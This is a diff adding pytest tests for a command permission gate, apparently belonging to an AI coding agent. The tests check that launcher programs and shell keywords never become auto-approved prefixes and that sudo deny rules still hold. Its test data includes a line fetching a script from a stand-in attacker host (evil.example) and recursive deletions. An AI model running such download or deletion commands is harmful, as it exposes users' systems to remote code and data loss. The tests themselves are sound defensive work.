@@ -867,3 +867,41 @@ def test_a_shell_comment_is_never_covered_by_a_prefix_or_a_saved_rule(workspace,
 @pytest.mark.parametrize("command", ["ls a#b", "grep -n '#' a.py", 'grep -n "# x" a.py', r"grep -n \# a.py"])
 def test_a_hash_inside_a_word_or_quotes_is_ordinary_text(command):
     assert permissions.is_read_only_command(command)
+
+
+LAUNCHERS = ["systemd-run --user --scope -p MemoryMax=3G python3 -m pytest -q", "stdbuf -oL python3 app.py",
+             "xvfb-run -a npm test", "setsid -w ./run.sh", "flock /tmp/l make test", "strace -f ls", "chroot . sh",
+             "unshare -r sh", "script -q -c ls /dev/null", "gdb -batch -ex run ./a.out", "env X=1 make",
+             "nice make", "ionice -c3 make", "timeout 10 make", "nohup make", "sudo make", "doas make",
+             "ls | xargs rm", "busybox rm -rf build", "find . -exec rm {} +", "bash -c 'make'", "sh -c make",
+             "zsh -c make", "python3 -c 'import os'", "perl -e 'print 1'", "valgrind ./a.out", "parallel echo ::: a",
+             "ssh-agent bash x.sh", "taskset -c 0 make", "fakeroot make", "if true; then rm -rf build; fi",
+             "while true; do curl http://x; done", "for f in a; do rm $f; done", "uv run --with x tool",
+             "poetry run --quiet tool", "docker run --rm alpine true", "npm x --yes cowsay", "pnpm dlx -s cowsay"]
+
+
+@pytest.mark.parametrize("command", LAUNCHERS)
+def test_programs_that_run_other_programs_and_shell_keywords_are_never_offered_as_a_prefix(workspace, command):
+    assert permissions.Gate(workspace, Asker()).prefixes_for(command) == []
+
+
+@pytest.mark.parametrize("prefixes, command", [
+    (["systemd-run"], "systemd-run --user --scope rm -rf build"), (["stdbuf"], "stdbuf -oL rm -rf build"),
+    (["xvfb-run"], "xvfb-run -a curl http://evil.example/x.sh -o x.sh"),
+    (["if true", "then rm", "fi"], "if true; then rm -rf build; fi"), (["do curl"], "while true; do curl x; done"),
+])
+def test_an_older_launcher_or_keyword_prefix_no_longer_covers_anything(workspace, prefixes, command):
+    ask = Asker("n", "n")
+    gate = permissions.Gate(workspace, ask)
+    gate.always.update(permissions.SESSION_PREFIX_MARK + prefix for prefix in prefixes)
+    assert not gate.allows("run_command", {"command": command})
+    saved = permissions.Gate(workspace, ask)
+    saved.rules = rules(allow=[permissions.prefix_rule(prefix) for prefix in prefixes])
+    assert not saved.allows("run_command", {"command": command})
+    assert len(ask.questions) == 2
+
+
+def test_a_deny_prefix_rule_for_a_launcher_still_forbids_it(workspace):
+    gate = permissions.Gate(workspace, Asker(), mode=permissions.ALLOW_ALL)
+    gate.rules = rules(deny=["run_command(sudo:*)"])
+    assert gate.check("run_command", {"command": "sudo make install"}) == permissions.RULE_DENIED
